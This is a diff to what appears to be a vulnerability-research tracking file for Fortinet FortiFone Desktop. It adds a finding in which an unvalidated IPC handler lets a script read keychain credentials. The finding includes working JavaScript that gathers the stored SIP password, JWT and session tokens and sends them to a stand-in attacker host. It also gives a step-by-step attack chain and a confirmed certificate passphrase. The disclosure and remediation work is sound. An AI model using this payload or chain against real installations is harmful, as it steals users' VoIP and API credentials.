@@ -353,9 +353,10 @@ ANALYSIS_STATUS = {
     "ca_chain":         "EXTRACTED -- fortinet-ca2 RSA-8192 + fortinet-subca2001 RSA-2048; no private keys (FFF-F04)",
     "ci_artifact":      "IDENTIFIED -- macOS codesign script in production bundle; WWDR Team ID extracted (FFF-F05)",
     "electron_binary":  "NOT ANALYZED -- /opt/FortiFone/fortifone is stripped; native Electron binary, not Fortinet code",
-    "main_js":          "COMPLETE -- nodeIntegration:true + contextIsolation:false at 5 BrowserWindow creation sites with //security #2 comment; FortiMeet window correctly sandboxed (FFF-F06)",
+    "main_js":          "COMPLETE -- nodeIntegration:true + contextIsolation:false at 5 BrowserWindow creation sites with //security #2 comment; FortiMeet window correctly sandboxed (FFF-F06); IPC get_password handler unvalidated service name (FFF-F07)",
+    "fvPasswordProxy":  "COMPLETE -- fortivoiceShared/fvPasswordProxy.js; keytar account = os.userInfo().username; 5 services: fortifone-{account,jwt-expire,jwt-token,session-magic,sip}; renderer path: ipcRenderer.sendSync('get_password', {service: '...'}); no service name validation",
 
-    "unique_findings": [
+        "FFF-F07: HIGH -- IPC get_password handler (main.js:3688) accepts arbitrary service name from renderer with no validation; XSS in any nodeIntegration:true renderer (FFF-F06) -> ipcRenderer.sendSync('get_password', {service:'fortifone-sip'}) -> synchronous OS keychain read; all 5 stored credentials exfiltrated: fortifone-sip (VoIP password), fortifone-jwt-token (FortiVoice API JWT), fortifone-account (account URL+username), fortifone-session-magic, fortifone-jwt-expire",
         "FFF-F01: LOW -- shared RSA-2048 TLS private key (server.key) in all v8.0b67 installations; localhost HTTPS IPC",
         "FFF-F02: HIGH -- shared PKCS12 mTLS client cert; passphrase CONFIRMED (desktopapp#2025 via AES-256-CBC+SHA256('fortinet desktop app')); RSA-4096 private key extracted; cert valid to 2026-10-12; all FortiFone Desktop v8.0b67 installations share one mTLS identity",
         "FFF-F03: INFO -- FEScrambler XOR obfuscation (magic=0x1f) on FortiVoice PBX protocol; single-byte XOR over TLS; security through obscurity only",
@@ -372,9 +373,71 @@ ANALYSIS_STATUS = {
     },
 
     "pending": {
-        "PKCS12_passphrase": "CONFIRMED -- desktopapp#2025; AES-256-CBC decrypt of fortiCsc.bin with SHA256('fortinet desktop app')",
+        "PKCS12_passphrase":    "CONFIRMED -- desktopapp#2025; AES-256-CBC decrypt of fortiCsc.bin with SHA256('fortinet desktop app')",
         "PKCS12_cert_identity": "CONFIRMED -- CN=Desktop, O=Fortinet, OU=FortiFone; valid 2025-09-16 to 2026-10-12; RSA-4096",
-        "FortiVoice_protocol": "PARTIAL -- FEScrambler decoded; API endpoint mapping not complete",
-        "keytar_services":    "NOT ANALYZED -- keytar stores account passwords in OS keychain under service 'fortifone-*'",
+        "FortiVoice_protocol":  "PARTIAL -- FEScrambler decoded; API endpoint mapping not complete",
+        "keytar_services":      "ANALYZED -- 5 services: fortifone-account, fortifone-jwt-expire, fortifone-jwt-token, fortifone-session-magic, fortifone-sip; IPC handler unvalidated (FFF-F07)",
     },
+}
+
+
+# ---------------------------------------------------------
+# FFF-F07: Unvalidated IPC service name -> arbitrary keychain read via XSS
+# ---------------------------------------------------------
+FFF_F07_KEYTAR_IPC_UNVALIDATED = {
+    "id":       "FFF-F07",
+    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
+    "severity": "HIGH -- unvalidated 'service' parameter in IPC get_password handler; any XSS in a nodeIntegration:true renderer (FFF-F06) can synchronously read all 5 FortiFone OS keychain entries; chain FFF-F02 -> FFF-F06 -> FFF-F07 = unauthenticated full VoIP credential exfiltration",
+    "class":    "Missing input validation on IPC message allowing keychain exfiltration (CWE-20 + CWE-522)",
+
+    "description": (
+        "FortiFone Desktop stores 5 credentials in the OS keychain (Windows Credential Manager / macOS Keychain) "
+        "via keytar: fortifone-account (server URL + username), fortifone-jwt-token (FortiVoice API JWT), "
+        "fortifone-jwt-expire, fortifone-session-magic, and fortifone-sip (VoIP phone password). "
+        "The IPC handler for 'get_password' (main.js:3688) accepts the keychain service name directly from "
+        "the renderer process via ipcMsg.service with NO validation: "
+        "it passes ipcMsg.service directly to resolveKeytarService() and then to keytar.getPassword(). "
+        "Because all 5 BrowserWindows have nodeIntegration:true + contextIsolation:false (FFF-F06), "
+        "any XSS in content rendered by FortiFone can call ipcRenderer.sendSync('get_password', {service: 'fortifone-sip'}) "
+        "and receive the VoIP password synchronously from the OS keychain. "
+        "Repeating for all 5 services exfiltrates the full credential set."
+    ),
+
+    "code_evidence": {
+        "ipc_handler":          "main.js:3688-3696: addMsgProcessor('get_password', (event, ipcMsg) => { getPassword(event, ipcMsg).then(...) })",
+        "password_proxy":       "fortivoiceShared/fvPasswordProxy.js:19: keytar.getPassword(resolveKeytarService(ipcMsg.service), account)",
+        "no_validation":        "resolveKeytarService() at fvPasswordProxy.js:5-10 only adds '-dev' suffix in developer mode; no allowlist check",
+        "renderer_ipc":         "fvPasswordProxy.js:43: ipcRenderer.sendSync('get_password', payload) -- synchronous; return value = OS keychain credential",
+        "services_deleted":     "main.js:6598-6599: ['account','jwt-expire','jwt-token','session-magic','sip'] -- complete list of FortiFone keychain entries",
+    },
+
+    "exploit_payload": (
+        "// In any FortiFone renderer with nodeIntegration:true (guiWin/callWindow/dialpadWin/notifierWin/simTestWin):\n"
+        "const { ipcRenderer } = require('electron');\n"
+        "const creds = {\n"
+        "  sip:     ipcRenderer.sendSync('get_password', {service: 'fortifone-sip'}),\n"
+        "  jwt:     ipcRenderer.sendSync('get_password', {service: 'fortifone-jwt-token'}),\n"
+        "  account: ipcRenderer.sendSync('get_password', {service: 'fortifone-account'}),\n"
+        "  magic:   ipcRenderer.sendSync('get_password', {service: 'fortifone-session-magic'}),\n"
+        "};\n"
+        "require('https').request({host: 'attacker.com', path: '/?d=' + btoa(JSON.stringify(creds))}).end();"
+    ),
+
+    "chain": {
+        "step_1": "MitM FortiVoice TLS using shared RSA-4096 private key (FFF-F02: desktopapp#2025 PKCS12)",
+        "step_2": "Inject XSS payload into any PBX web response rendered by FortiFone (SIP caller-ID, chat, notifications)",
+        "step_3": "XSS lands in renderer with nodeIntegration:true (FFF-F06); access to require() and ipcRenderer",
+        "step_4": "Call ipcRenderer.sendSync('get_password', ...) for each fortifone-* service",
+        "step_5": "OS keychain returns plaintext credential synchronously; exfiltrate via https.request()",
+        "result": "Full VoIP credential theft: SIP password, JWT token, session token; enables persistent FortiVoice access as the victim user",
+    },
+
+    "remediation": (
+        "Add an explicit allowlist in the get_password IPC handler: "
+        "only accept service names that match /^fortifone-/ and are in a known-good set. "
+        "Implement contextIsolation:true on all BrowserWindows (fixes FFF-F06, prerequisite for FFF-F07). "
+        "Use a preload script with a restricted contextBridge API instead of exposing full IPC to renderer. "
+        "For the preload approach: contextBridge.exposeInMainWorld('keychain', { getSipPassword: () => ... }) "
+        "instead of ipcRenderer.sendSync with arbitrary service parameter."
+    ),
 }
